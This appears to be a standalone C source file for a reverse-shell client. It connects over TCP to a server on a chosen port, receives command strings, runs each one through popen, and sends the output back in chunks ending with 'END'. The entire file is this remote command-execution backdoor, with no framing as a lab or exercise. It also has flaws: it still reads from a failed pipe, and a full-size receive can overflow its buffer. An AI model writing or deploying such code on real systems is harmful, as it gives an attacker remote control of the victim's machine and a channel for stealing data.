
  
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#define MAX_CHUNK_SIZE 1024
#define BUFFER_SIZE 1024
void send_chunk(const char* chunk, int chunk_length, int client_socket) {
    if (send(client_socket, chunk, chunk_length, 0) < 0) {
        perror("Error sending data");
        exit(EXIT_FAILURE);
    }
}

void send_chunks(const char* message, int message_length, int client_socket) {
    int num_chunks = (message_length + BUFFER_SIZE - 1) / BUFFER_SIZE;
    int i;
    for (i = 0; i < num_chunks; i++) {
        int start_index = i * BUFFER_SIZE;
        int chunk_length = (i == num_chunks - 1) ? message_length - start_index : BUFFER_SIZE;
        send_chunk(message + start_index, chunk_length, client_socket);
    }
    // Send end of transmission indicator
    send_chunk("END", 3, client_socket);
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <port>\n", argv[0]);
        return 1;
    }
    int port = atoi(argv[1]);
    int sockfd;
    struct sockaddr_in server;
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set up server details
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = INADDR_ANY;

    // Connect to the server
    if (connect(sockfd, (struct sockaddr*) &server, sizeof(server)) < 0) {
        perror("Connection failed");
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        // Receive command from server
        char command[BUFFER_SIZE];
        int bytes_received = recv(sockfd, command, sizeof(command), 0);
        if (bytes_received < 0) {
            perror("Error receiving command from server");
            break;
        }

        command[bytes_received] = '\0';

        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Execute command locally
        FILE* pipe = popen(command, "r");
        if (!pipe) {
            //perror("Error executing command");
            if (send(sockfd, "Error executing command", strlen("Error executing command"), 0) < 0) {
            printf("Send failed");
            return 1;
        }
        }

        // Read command output into the output buffer
       char chunk[MAX_CHUNK_SIZE];
       while (fgets(chunk, sizeof(chunk), pipe) != NULL) {
        if (send(sockfd, chunk, strlen(chunk), 0) < 0) {
            printf("Send failed");
            return 1;
        }
    }
       send_chunk("END", 3, sockfd);
        // Close the pipe
        pclose(pipe);

       
    }

    close(sockfd);
    return 0;
}
